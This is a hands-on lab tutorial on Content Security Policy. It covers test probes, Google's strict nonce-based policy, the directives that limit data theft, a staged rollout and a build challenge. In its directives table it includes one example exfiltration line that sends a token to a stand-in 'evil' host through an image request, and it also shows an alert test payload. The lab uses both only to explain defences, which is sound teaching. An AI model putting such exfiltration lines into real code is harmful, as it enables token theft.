# Lab 02 — Content Security Policy ⭐⭐⭐⭐⭐

**Goal:** ship a policy that actually stops script injection, without an outage.

**Primary metric:** which of the seven probes still run.

> <http://localhost:8080/security-and-auth/labs/02-csp/>

---

## What CSP is

A response header that tells the browser **which sources of content this document is allowed to
use**. It doesn't fix a vulnerability; it removes the attacker's payoff. After a successful
injection, a good policy is the difference between "defaced a div" and "read every token and posted
them to evil.com".

## The probes

Run each preset and record what survives:

| policy | inline script | eval | external same-origin | external cross-origin | inline style | x-origin image | x-origin fetch |
|---|---|---|---|---|---|---|---|
| none | | | | | | | |
| `default-src 'self'` | | | | | | | |
| `+ 'unsafe-inline' 'unsafe-eval'` | | | | | | | |
| nonce-based | | | | | | | |
| strict-dynamic | | | | | | | |
| `default-src 'none'` | | | | | | | |

Read the table as an attacker: **every "ran" is a capability an injection inherits.**

- inline script runs → an injected `<script>` runs
- `eval` runs → a JSON-ish payload can become code
- cross-origin fetch runs → stolen data has a way out (`connect-src` is the exfiltration control
  people forget)

## The policy to aim for

Google's "strict CSP" — the only shape that has held up:

```
Content-Security-Policy:
  script-src 'nonce-{random}' 'strict-dynamic' https: 'unsafe-inline';
  object-src 'none';
  base-uri 'none';
```

| Piece | Why |
|---|---|
| `'nonce-{random}'` | a fresh random value **per response**. Not per deploy, not derived from anything guessable. A predictable nonce is no nonce. |
| `'strict-dynamic'` | a script that already passed may load more scripts — this is what lets CSP survive bundlers, dynamic `import()` and tag managers |
| `https: 'unsafe-inline'` | fallbacks for old browsers. Modern browsers **ignore both** once a nonce is present — that's specified, not luck |
| `object-src 'none'` | `<object>`/`<embed>` are legacy script-execution vectors |
| `base-uri 'none'` | stops `<base href>` from re-pointing every relative script URL. The non-obvious hole in nonce-only policies |

**Why not a host allow-list?** Because `script-src https://cdn.example.com` is defeated by one old
AngularJS, JSONP endpoint, or bundled-callback file anywhere on that host. Host allow-lists have
been measured as bypassable on the large majority of real policies. Nonces don't have that failure
mode.

### The directives that aren't about script execution

| Directive | Stops |
|---|---|
| `frame-ancestors` | clickjacking (replaces `X-Frame-Options`) |
| `connect-src` | exfiltration after an XSS |
| `form-action` | an injected form posting your data elsewhere |
| `img-src` | the sneakiest exfil channel: `new Image().src = 'https://evil/?' + token` |

**`default-src` is not a catch-all.** `frame-ancestors`, `form-action` and `base-uri` do **not**
fall back to it. And a policy delivered in a `<meta>` tag cannot use `frame-ancestors`,
`report-uri`, or `sandbox` at all — which is why the header is the real mechanism.

## The rollout that doesn't cause an incident

| # | Step | Why |
|---|---|---|
| 1 | Ship `Content-Security-Policy-Report-Only` with the target policy | zero risk, real traffic |
| 2 | Collect reports for 1–2 weeks | finds the inline handler in the 2019 template |
| 3 | **Fix the app, not the policy** | move inline scripts to files, delete `eval`, add nonces |
| 4 | Add nonces to what must stay inline | per-response random |
| 5 | Enforce — and start a *new* Report-Only for the next tightening | both headers can run side by side |

Step 3 is the one teams get wrong. Every `'unsafe-inline'` added to make a report go away converts
the policy into decoration.

**Budget for noise.** Browser extensions, ISP injection and old browsers generate violation reports
you cannot fix. Filter on whether `blocked-uri` is something you recognise.

## Think about

- Your app uses a tag manager that injects arbitrary scripts. Can you have a strict CSP?
- What does CSP do about an XSS that only defaces the page?
- Why does adding a nonce make `'unsafe-inline'` stop working?

<details>
<summary>Answers</summary>

**Tag manager.** Only with `'strict-dynamic'`: nonce the tag-manager loader, and scripts it injects
via `document.createElement('script')` inherit trust. What you *cannot* do is keep a host allow-list
and call it strict — and you should understand that you've delegated your script-execution policy to
whoever can publish a container. That's a business decision to make consciously.

**Defacement.** Very little. CSP restricts *sources*, so an injection that only writes markup — a
fake login form, misleading text — is largely unaffected, except that `form-action` limits where
that fake form can post. This is why CSP is the second line: it shrinks the blast radius, it does
not close the hole.

**Nonce vs `'unsafe-inline'`.** Specified behaviour: if a nonce or hash source is present in
`script-src`, `'unsafe-inline'` is ignored. That's what makes the backwards-compatible policy safe —
old browsers that don't understand nonces fall back to `'unsafe-inline'` (no worse than before),
while modern ones enforce the nonce.
</details>

---

## 🏗️ Build challenge: a real strict CSP

1. **Generate a nonce per request** in your server/middleware, put it on `res.locals`, and render it
   into every `<script>` tag. In Next.js this is middleware + `headers()`; the important part is
   that the value is random per response, not per build.
2. **Report-only first**, with a `report-uri` pointing at an endpoint that stores violations with
   the URL, user agent, and directive.
3. **Build the dashboard query** that separates "our code" violations from extension noise.
4. **Remove the violations by fixing code**: inline handlers → `addEventListener`, inline styles →
   classes, `eval`/`new Function` → parse properly.
5. **Enforce**, then add `connect-src`, `frame-ancestors 'none'` (or your embedders), `form-action
   'self'`, `img-src` — each report-only first.
6. **Add a CI test** that fetches your production HTML and asserts the policy contains a nonce, has
   no `'unsafe-eval'`, and has `object-src 'none'` and `base-uri 'none'`.

**Done when:** an injected `<script>alert(1)</script>` in your app's own rendering path produces a
violation report and no execution — and your CI test fails if someone re-adds `'unsafe-inline'`.

---

## Interview questions

1. What does CSP prevent, and what does it not?
2. Nonce vs hash vs host allow-list — when is each right?
3. What does `'strict-dynamic'` change?
4. Why `base-uri 'none'`?
5. How do you deploy a policy to a large app without breaking it?
6. Which directives don't inherit from `default-src`?
